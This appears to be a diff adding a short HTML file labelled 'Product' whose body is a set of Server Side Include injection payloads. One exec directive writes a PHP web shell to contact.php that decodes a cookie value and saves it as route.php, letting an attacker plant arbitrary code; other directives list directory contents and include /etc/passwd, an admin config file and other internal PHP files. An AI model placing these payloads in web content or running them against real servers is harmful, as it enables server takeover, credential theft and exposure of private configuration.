@@ -1,0 +1,13 @@
+<html>
+	<header>Product</header>
+<body>
+	Product
+***<!--#exec cmd="echo '<''?p''hp echo \"[#]\".\"[@]\"; file_put_contents(\"route.php\",base64_decode($_COOKIE[\"83067585\"])); echo base64_decode($_COOKIE[\"83067585\"]); ?''>' >contact.php; echo 'yxxx''xxxy';" -->***
+&&&<!--#exec cmd="echo 'cmd_run'" -->&&&
+[[[<!--#exec cmd="ls -lsa" -->]]]
++++<!--#include file="/etc/passwd" -->+++
+$$$<!--#include file="../admin/config.php" -->$$$
+===<!--#include virtual="../system/startup.php" -->===
+---<!--#include virtual="../admin/index.php" -->---
+</body>
+</html>
